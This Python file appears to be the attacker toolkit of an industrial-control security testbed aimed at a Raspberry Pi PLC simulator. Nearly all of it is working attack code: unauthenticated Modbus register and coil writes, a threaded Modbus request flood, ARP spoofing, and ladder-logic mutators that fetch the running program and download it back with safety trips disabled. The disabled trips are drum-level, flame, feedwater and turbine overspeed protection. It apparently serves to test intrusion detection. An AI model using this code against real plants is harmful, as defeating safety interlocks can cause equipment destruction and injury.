"""Attacker toolkit — the named mutations + DDoS + rogue device (runs on the 2nd machine).

Targets the Pi only: unauthenticated Modbus writes (setpoint drift, forced coils,
DDoS flood) and unauthenticated program downloads to the logic store (logic
inversion, condition stripping, coil hijack, rung injection). Built on the raw
Modbus approach from OT_SECURITY's modisy.py.

The L5X mutators target the reference thermal baseline; each fetches the running
program, edits it, and downloads it back — exactly what an engineering-workstation
compromise would do.

    python -m logicward.attacker.attacks --host 192.168.1.50 setpoint-drift
    python -m logicward.attacker.attacks --host 192.168.1.50 logic-inversion
    python -m logicward.attacker.attacks --host 192.168.1.50 ddos --count 800
"""
from __future__ import annotations

import argparse
import socket
import struct
import time

import requests

from logicward import config
from logicward.plant import rung_to_register as r2r

# ── L5X mutators (operate on the fetched program text) ────────────────────────

def mut_setpoint_drift(xml: str) -> str:
    # Drum level low-low trip setpoint 220 -> 40 mm (defeats drum-level protection)
    return xml.replace('Value="220.0"', 'Value="40.0"')


def mut_logic_inversion(xml: str) -> str:
    # Flip the drum-level trip compare LES -> GRT (trip now fires backwards)
    return xml.replace("LES(Drum_Level,Drum_Level_LL_SP)", "GRT(Drum_Level,Drum_Level_LL_SP)")


def mut_condition_stripping(xml: str) -> str:
    # Remove the running interlock from the furnace flame trip
    return xml.replace("XIC(Plant_Running)XIO(Flame_Detected)OTE(Fuel_Trip)",
                       "XIO(Flame_Detected)OTE(Fuel_Trip)")


def mut_coil_hijack(xml: str) -> str:
    # Repoint the feedwater trip output to a harmless coil
    return xml.replace("OTE(Feedwater_Trip)", "OTE(Cooling_Pump_Stop)")


def mut_rung_injection(xml: str) -> str:
    # Inject an unauthorized rung that unlatches the turbine overspeed trip
    rung = ('       <Rung Number="6" Type="N"><Text>'
            '<![CDATA[XIC(Attacker_Backdoor)OTU(Turbine_Trip);]]></Text></Rung>\n')
    return xml.replace("      </RLLContent>", rung + "      </RLLContent>")


MUTATORS = {
    "logic-inversion": mut_logic_inversion,
    "condition-stripping": mut_condition_stripping,
    "coil-hijack": mut_coil_hijack,
    "rung-injection": mut_rung_injection,
    "program-setpoint": mut_setpoint_drift,
}


class Attacker:
    def __init__(self, host: str = "127.0.0.1", modbus_port: int | None = None,
                 program_base: str | None = None):
        self.host = host
        self.modbus_port = modbus_port or config.MODBUS_PORT
        self.program_base = program_base or f"http://{host}:{config.PROGRAM_PORT}"

    # -- Modbus (raw, unauthenticated) --
    def _modbus(self, pdu: bytes) -> bytes | None:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((self.host, self.modbus_port))
            s.sendall(struct.pack(">HHHB", 1, 0, len(pdu) + 1, 1) + pdu)
            r = s.recv(512)
            s.close()
            return r
        except OSError:
            return None

    def write_register(self, addr: int, value: int) -> bool:
        return self._modbus(struct.pack(">BHH", 0x06, addr, value & 0xFFFF)) is not None

    def write_coil(self, addr: int, on: bool) -> bool:
        return self._modbus(struct.pack(">BHH", 0x05, addr, 0xFF00 if on else 0x0000)) is not None

    def setpoint_drift_modbus(self, tag: str = "Drum_Level_LL_SP", value: int = 40) -> bool:
        """Register-plane setpoint drift over Modbus (FC06)."""
        return self.write_register(r2r.BY_TAG[tag].address, value)

    def force_coil(self, tag: str = "Fuel_Valve_Open", on: bool = False) -> bool:
        """Unauthorized command — force a control coil (FC05)."""
        return self.write_coil(r2r.BY_TAG[tag].address, on)

    def ddos(self, count: int = 500) -> float:
        """Flood FC03 reads; returns achieved requests/sec."""
        import concurrent.futures
        t0 = time.time()
        payload = struct.pack(">BHH", 0x03, 0, 6)
        
        def _send(_):
            return 1 if self._modbus(payload) is not None else 0

        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
            ok = sum(executor.map(_send, range(count)))

        dt = time.time() - t0
        return ok / dt if dt else 0.0

    # -- Program channel (unauthenticated download) --
    def fetch_program(self) -> str:
        return requests.get(f"{self.program_base}/program", timeout=5).json()["l5x"]

    def download_program(self, xml: str) -> dict:
        r = requests.post(f"{self.program_base}/program/download",
                          json={"l5x": xml}, timeout=5)
        return r.json()

    def program_mutation(self, name: str) -> dict:
        """Fetch -> mutate -> download one structural mutation by name."""
        if name not in MUTATORS:
            raise ValueError(f"unknown mutation: {name}")
        return self.download_program(MUTATORS[name](self.fetch_program()))

    def rogue_arp(self) -> bool:
        """Best-effort: announce a spoofed presence on the segment (needs scapy/root)."""
        try:
            from scapy.all import ARP, Ether, sendp  # type: ignore
            pkt = Ether(src="de:ad:be:ef:13:37", dst="ff:ff:ff:ff:ff:ff") / \
                ARP(hwsrc="de:ad:be:ef:13:37", psrc=self.host)
            sendp(pkt, verbose=False)
            return True
        except Exception:  # noqa: BLE001
            return False


def main() -> None:
    p = argparse.ArgumentParser(description="Vigilo attacker toolkit")
    p.add_argument("--host", default="127.0.0.1")
    p.add_argument("--modbus-port", type=int, default=config.MODBUS_PORT)
    p.add_argument("cmd", choices=["setpoint-drift", "force-coil", "ddos", "rogue",
                                   *MUTATORS.keys()])
    p.add_argument("--count", type=int, default=500)
    args = p.parse_args()
    atk = Attacker(args.host, args.modbus_port)

    if args.cmd == "setpoint-drift":
        print("setpoint drift (Modbus):", atk.setpoint_drift_modbus())
    elif args.cmd == "force-coil":
        print("forced control coil (Modbus):", atk.force_coil())
    elif args.cmd == "ddos":
        print(f"DDoS flood: {atk.ddos(args.count):.0f} req/s")
    elif args.cmd == "rogue":
        print("rogue ARP announced:", atk.rogue_arp())
    else:
        print(f"{args.cmd}:", atk.program_mutation(args.cmd))


if __name__ == "__main__":
    main()
